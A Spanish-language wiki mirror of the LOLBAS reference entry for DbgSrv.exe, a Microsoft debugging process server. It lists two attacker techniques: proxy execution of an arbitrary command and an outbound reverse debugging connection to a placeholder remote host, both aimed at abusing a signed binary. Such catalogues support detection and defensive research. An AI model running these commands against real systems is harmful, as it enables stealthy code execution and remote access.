# LOLBAS: DbgSrv.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

A process server included with Debugging Tools for Windows for remote user-mode debugging.

## Comandos

### Proxy execution of a command through a trusted Microsoft-signed debugging utility.

Execute · priv: User · T1127

```cmd
dbgsrv.exe -t tcp:port=5005 -c {CMD}
```

Creates a process server and launches the specified command using the DbgSrv.exe -c option.

### Establish a reverse remote-debugging channel through a trusted Microsoft-signed developer utility.

Execute · priv: User · T1127

```cmd
dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
```

Establishes an outbound reverse connection from the DbgSrv process server to a remote debugging client using the clicon option. A connected debugging client can subsequently interact with processes through the remote debugging session.

